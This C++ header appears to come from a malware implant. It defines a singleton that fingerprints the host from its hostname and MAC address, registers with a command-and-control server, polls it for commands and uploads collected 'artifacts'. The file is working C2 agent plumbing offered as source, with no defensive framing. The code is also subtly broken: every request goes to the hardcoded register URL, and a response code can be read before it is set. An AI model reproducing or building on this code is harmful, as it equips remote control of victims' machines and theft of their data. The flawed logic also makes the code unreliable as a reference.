#pragma once

#include <iostream>
#include <string>
#include <mutex>
#include "../include/curl/curl.h"
#include "../include/json.hpp"
#include "../Utils/CryptoUtils.h"
#include "../Utils/MachineUtils.h"

using json = nlohmann::json;

#define C2_HOST "http://127.0.0.1:1234"
#define REGISTER_URI C2_HOST"/c2/register"
#define CHECK_NEW_CMD_URI C2_HOST"/c2/new_command"
#define KEEP_ALIVE_URI C2_HOST"/c2/keep_alive"
#define SEND_ARTIFACT C2_HOST"/c2/send_artifact"

class Communicator
{
private:
    std::string client_id;
    CURL * curl;
    std::mutex curl_mtx;

    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
        ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
    }

    bool send_request_safe(std::string uri, json payload, json * response_ptr, bool post=true)
    {
        std::lock_guard<std::mutex> lock(curl_mtx);

        std::cout << "Sending request to " << uri << std::endl; 
        std::cout << "Payload: " << payload.dump() << std::endl;

        std::string response_buf;
        long resp_code;
        curl = curl_easy_init();
        struct curl_slist *headers = NULL;
        CURLcode res;

        /* Each message should have a client identifier */
        if(!(payload.contains("client_id")))
        {
            payload["client_id"] = client_id;    
            std::cout << "client id: " << payload["client_id"] << std::endl;
        }

        std::cout << "client id: " << payload["client_id"] << std::endl;

        /* We always set the Content-Type to be json*/
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:1234/c2/register/");
        if (post)
        {
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            if(!payload.empty())
            {
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.dump().c_str());
            }
        }

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_buf);
        
        res = curl_easy_perform(curl);
    
        if (res != CURLE_OK) 
        {
            std::cerr << "curl_easy_perform() failed " << curl_easy_strerror(res);
        }  
        else if (curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &resp_code) && resp_code == 200)
        {
            char * content_type;
            res = curl_easy_getinfo(curl, CURLINFO_CONTENT_TYPE, &content_type);
            if ((res == CURLE_OK) && content_type && std::string(content_type).find("application/json") != std::string::npos && response_ptr)  
            {
                /* If the server sent us some json - Such as a new command */
                *response_ptr = json::parse(response_buf);
            }
            else
            {
                std::cout << "response buffer: " << response_buf << std::endl;
            }
        }
        else
        {
            std::cerr << "Unsuccessfull HTTP Response Code" << resp_code << std::endl;
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);

        return resp_code == 200;
    }
    
    bool keep_alive()
    {
        return send_request_safe(KEEP_ALIVE_URI, NULL, NULL);
    }

    Communicator() {
        init();
    }

    void generate_agent_id()
    {
	    std::string hostname = MachineUtils::get_host_name();
        std::string macaddr = MachineUtils::get_mac_address();
        std::stringstream ss(hostname);
        ss << "-" << macaddr;
        client_id = CryptoUtils::md5(ss.str());
    }

    void init()
    {
        generate_agent_id();
        if(curl_global_init(CURL_GLOBAL_DEFAULT) != CURLE_OK)
        {
            throw std::runtime_error("Can't init libcurl. Aborting !");
        }
    }

public:
    
    static Communicator& getInstance() {
        static Communicator instance;
        return instance;
    }
    
    Communicator(const Communicator&) = delete;
    Communicator& operator=(const Communicator&) = delete;

    ~Communicator() {
        curl_global_cleanup();
    }

    bool check_new_command(json * cmd)
    {
        /* 
        We send on payload to the server in this case. 
        We only expect a response payload from the server. 
        */
       json cmd_current;
        bool res = send_request_safe(CHECK_NEW_CMD_URI, NULL, &cmd_current);
        if (res)
        {
            if(cmd_current.contains("status") && cmd_current["status"] == "error")
            {
                std::cout << "Failed fetching new command: " << cmd_current["message"] << std::endl;
                return false;
            }

            *cmd = cmd_current;
            
            return true;
        }
        
        std::cout << "Failed fetching new command due to server error" << std::endl;
        return false;
    }

    bool c2_registration()
    {
        json response;
        json registration_payload;
        registration_payload["client_id"] = client_id;

        return send_request_safe(REGISTER_URI, registration_payload, &response) && response.contains("status") && response["status"] == "0";
    }

    void send_artifact(json payload)
    {
        json response;
        send_request_safe(SEND_ARTIFACT, payload, &response);
    }
};
